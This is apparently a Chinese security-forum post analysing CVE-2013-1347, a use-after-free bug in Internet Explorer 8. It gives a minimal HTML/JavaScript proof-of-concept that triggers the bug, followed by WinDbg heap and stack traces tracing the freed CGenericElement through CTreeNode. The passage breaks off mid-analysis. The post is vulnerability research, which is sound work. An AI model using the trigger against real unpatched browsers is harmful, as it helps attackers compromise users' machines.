
# [原创]CVE-2013-1347（IE8 UAF漏洞）分析

深夜失眠，发篇报告压压惊....

似乎有人发过这个漏洞分析，不过貌似不是很详细哈~虽然我也不是分析的很详细~![](https://bbs.kanxue.com/view/img/face/16.gif)

有些没有分析清楚的地方可能是没有时间去搞了....

一个月前分析的，我记得没有参考其他人的成果，完全是从0开始的...所以有些思路可能比较幼稚和暴力...大神们轻拍....有错的地方也请指正~拜谢...

## IE8 UAF（CVE-2013-1347）分析报告

### 一、概述

5月份的一个漏洞，大体上的原因早就搞清楚了，胃病耽误了两周，研究一些具体的细节用了很长时间。但是由于复杂的函数太多，再加上IE内部的树结构操作使用了很多复杂的算法，以前泄漏的那点代码参考价值有限，还是有一些地方弄得不是特别清楚。

另外这个漏洞的成因还是挺有代表性的，基本是目前IE漏洞的形势。

OK，废话不说了。

首先分析一下POC，在看POC之前，有几个概念需要清楚：

- 块元素
- 内联元素

具体的概念和差别可以看下面的连接（很重要）

52eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8U0y4W2)9J5k6h3y4G2L8g2)9J5c8X3W2F1k6X3!0$3K9h3g2%4i4K6u0r3b7i4u0@1K9h3y4D9k6g2)9#2k6U0b7#2z5o6M7%4i4K6u0W2K9s2c8E0L8l9`.`.

下面是POC：

POC：（最精简版本，任何一条语句都不能再删了）

```html
<!doctype html>
<HTML>
<head>
<script>
function helloWorld()
{
    f0 = document.createElement('span');
    document.body.appendChild(f0);
    f1 = document.createElement('span');
    document.body.appendChild(f1);
    f2 = document.createElement('span');
    document.body.appendChild(f2);
    document.body.contentEditable="true";
    ##创建3课树，并完成渲染，需要注意f0,f1,f2要是内联元素，不一定非要是span
    f1.appendChild(document.createElement('table'));
    f2.appendChild(document.createElement('datalist'));
    ##f1必须是一个块元素，f2必须要是一个内联元素（只要是内联元素就行，不一定是CGenericElement对象，这个漏洞和CGenericElement对象也没有太大的关系）
    try      { f2.offsetParent=null;}
    catch(e) { }
    ##关键点1，漏洞成因！
    f1.innerHTML = "";
    f2.innerHTML = "";
    ##f1和f2都要删除
    f0.appendChild(document.createElement('hr'));
    ##关键点2，必不可少，必须是hr标签，至少我目前还没有找到可以替代的
    CollectGarbage();
}
</script>
</head>
<body onload="eval(helloWorld());">
</body>
</html>
```

根据POC来看，可以这个漏洞的限制点还是很多，这也说明漏洞的成因涉及很多方面。漏洞的利用比较稳定。由于win xp+IE8的组合还是有市场的（我大学的标配。。惭愧），所以漏洞的影响还是挺严重的。

### 二、具体分析

开启hpa和ust，GO。

```text
0:008> !heap -p -a ecx

    address 063bcfc8 found in
    \_DPH\_HEAP\_ROOT @ 151000
    in free-ed allocation (  DPH\_HEAP\_BLOCK:         VirtAddr         VirtSize)
                                    5d155c0:          63bc000             2000
    7c947553 ntdll!RtlFreeHeap+0x000000f9
    636b52c6 mshtml!CGenericElement::`vector deleting destructor'+0x0000003d
    63628a50 mshtml!CBase::SubRelease+0x00000022
    63640d1b mshtml!CElement::PrivateRelease+0x00000029
    6363d0ae mshtml!PlainRelease+0x00000025
    63663c03 mshtml!PlainTrackerRelease+0x00000014
    633a10b4 jscript!VAR::Clear+0x0000005c
    6339fb4a jscript!GcContext::Reclaim+0x000000ab
    6339fd33 jscript!GcContext::CollectCore+0x00000113
    63405594 jscript!JsCollectGarbage+0x0000001d
    633a92f7 jscript!NameTbl::InvokeInternal+0x00000137
    633a6650 jscript!VAR::InvokeByDispID+0x0000017c
    633a9c0b jscript!CScriptRuntime::Run+0x00002989
    633a5ab0 jscript!ScrFncObj::CallWithFrameOnStack+0x000000ff
    633a59f7 jscript!ScrFncObj::Call+0x0000008f
633a5743 jscript!CSession::Execute+0x00000175
```

通过查看崩溃点的栈回溯，可以很清楚的看到出问题的对象是`CGenericElement`对象，这也是最初很多人认为漏洞跟`CGenericElement`对象有关的原因。IE8对无法识别的对象都会生成`CGenericElement`对象。当然把`datalist`换成任意的一个行内元素（or 内联元素）时，如 span，a，b等，都会触发漏洞。

分析漏洞最重要的是跟踪数据流，我们要知道为什么这个已经释放的对象会被再次的引用。根据在IDA的查找可以看到：

![](https://bbs.kanxue.com/upload/attach/201307/548603_mqk9h4u3tjnlz9s.jpg)

根据IDA中的显示，可以知道`ecx`中的数据来自`ebx`，`ebx`中的数据即为悬挂指针。使用栈回溯查看`ebx`：

```text
0:008> !heap -p -a ebx

    address 04dfefb0 found in
    \_DPH\_HEAP\_ROOT @ 151000
    in busy allocation (  DPH\_HEAP\_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 50bb4a0:          4dfefb0               4c -          4dfe000             2000
    7c938f01 ntdll!RtlAllocateHeap+0x00000e64
    637724f2 mshtml!CMarkup::InsertElementInternal+0x0000022a
    6377234c mshtml!CDoc::InsertElement+0x0000008a
    637727f5 mshtml!CCommentElement::`scalar deleting destructor'+0x0000023d
    63772991 mshtml!CElement::InsertBeforeHelper+0x000000d1
    637728b7 mshtml!CElement::insertBefore+0x0000003c
    63772a38 mshtml!CElement::appendChild+0x00000039
    63791a83 mshtml!Method\_IDispatchpp\_IDispatchp+0x000000ca
```

可以看到`ebx`正是`CTreeNode`的地址。

所以这里我们可以得到的结论是：`CGenericElement`对象的地址保存在对应的`CTreeNode`结构中，但是`CGenericElement`对象删除后，仍然可以从`CTreeNode`结构中找到`CGenericElement`的指针，并发生寻址。一般来说造成这种漏洞的原因是下面两个之一：

1）`CGenericElement`对象的指针存储到`CTreeNode`结构中时，`CGenericElement`的引用计数没有加一，导致`CGenericElement`对象提前被释放。事实上，大部分UAF漏洞都是由于这个原因造成的（比如2012年底的那个`CButton`对象的UAF漏洞）

2）`CGenericElement`的引用计数都是正常的。问题处在`CTreeNode`结构上，`CTreeNode`没有及时的被删除（即删除晚了），这一般是由于`CTreeNode`结构的引用计数错误的+1造成（当然也不绝对）。

上述的两种情况，第一种比较简单，也比较好跟踪，但是可能性其实不高（微软不是吃素的，这种低级的错误一般不会犯的）。第二种的情况就比较复杂了，因为导致的原因实在太多，也会涉及到很复杂的IE内部数据结构的操作。

我们先排查一下第一种情况吧。

在`CGenericElement`的`CTreeNode`结构创建时（`637724f2 mshtml!CMarkup::InsertElementInternal+0x22a`）下断点，然后跟踪`CTreeNode`的赋值过程，观察`CGenericElement`的引用计数变化（数据写断点）。

具体的过程略，可以看到在这个过程中，`CGenericElement`的引用计数变化是正常的。所以可以基本排除1）的可能。

所以我们初步判断该漏洞是由于没有正确的删除`CTreeNode`对象导致的。

为了弄清楚原因，我们需要跟踪数据流，搞清这个`CTreeNode`是来自哪里的。

崩溃点的栈回溯：

```text
ChildEBP RetAddr  Args to Child
038ff1f8 63602718 038ff544 08142fb0 00000000 mshtml!CElement::Doc
038ff214 636026a3 08142fb0 038ff544 08142fb0 mshtml!CTreeNode::ComputeFormats+0xb9
038ff4c0 63612a85 08142fb0 08142fb0 038ff4e0 mshtml!CTreeNode::ComputeFormatsHelper+0x44
038ff4d0 63612a45 08142fb0 08142fb0 038ff4f0 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
038ff4e0 63612a2c 08142fb0 08142fb0 038ff4fc mshtml!CTreeNode::GetFancyFormatHelper+0xf
038ff4f0 63717f30 08142fb0 038ff50c 63717f4e mshtml!CTreeNode::GetFancyFormat+0x35
038ff4fc 63717f4e 00000000 08142fb0 038ff51c mshtml!ISpanQualifier::GetFancyFormat+0x5a
038ff50c 63717afe 00000000 07dccfa0 038ff554 mshtml!SLayoutRun::HasInlineMbp+0x10
038ff51c 63724f88 00000000 00000000 07dccfa0 mshtml!SRunPointer::HasInlineMbp+0x53
038ff554 6373a5a1 038ff573 00000000 00000000 mshtml!CLayoutBlock::GetIsEmptyContent+0xf1
038ff58c 6382ed01 038ff5f7 038ff60b 069faff0 mshtml!CLayoutBlock::GetIsEmptyContent+0x3f
038ff5d8 63702e23 06d8afc8 069faf30 07cf6fd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x250
038ff610 63708acf 069faf30 00000000 06cfcfc8 mshtml!CLayoutBlock::BuildBlock+0x1c1
038ff6d4 6370bd31 019faf30 04dbefa8 038ff703 mshtml!CCssDocumentLayout::GetPage+0x22a
038ff844 63668184 038ffa08 038ff9a0 00000000 mshtml!CCssPageLayout::CalcSizeVirtual+0x242
038ff97c 6368a1cb 04dbefa8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
038ffa78 6374799d 00100000 038ffad0 07deefd8 mshtml!CLayout::DoLayout+0x11d
038ffa8c 636514de 038ffad0 038ffad0 636678c6 mshtml!CCssPageLayout::Notify+0x140
038ffa98 636678c6 00000000 07df0fb0 00000000 mshtml!NotifyElement+0x41
038ffaac 63651658 038ffad0 07df0fb0 00000000 mshtml!NotifyTreeNode+0x62
```

根据上图的栈回溯开始找：

从`CTreeNode::GetFancyFormat`到`CTreeNode::ComputeFormats`都是`CTreeNode`的函数，都是通过寄存器（`ecx`，`eax`等）传递的`CTreeNode`结构。所以要从`ISpanQualifier::GetFancyFormat`函数开始追踪数据的来源。

根据IDA：

![](https://bbs.kanxue.com/upload/attach/201307/548603_j449v9k8vkw49yw.jpg)

可以看到`CTreeNode`是通过`ISpanQualifier::GetFancyFormat`的`eax`->`esi`->`ecx`传入到后面的函数里的。

`eax`里的值是来自于`SLayoutRun::HasInlineMbp`里的`eax`。而`SLayoutRun::HasInlineMbp`的`eax`是来自于`SRunPointer::HasInlineMbp`函数的这个地点：

![](https://bbs.kanxue.com/upload/attach/201307/548603_r5nc7h3ka6xxzh4.jpg)

这里首先是通过`edi`传给`eax`，然后执行函数`SRunPointer::SpanQualifier(void)`。我们现在不清楚`SRunPointer::SpanQualifier(void)`函数是否对`eax`寄存器做了修改。

实际上继续向上追踪`edi`的来源我们看到在`CLayoutBlock::GetIsEmptyContent`里：

![](https://bbs.kanxue.com/upload/attach/201307/548603_7zduxyiocbptw4i.jpg)
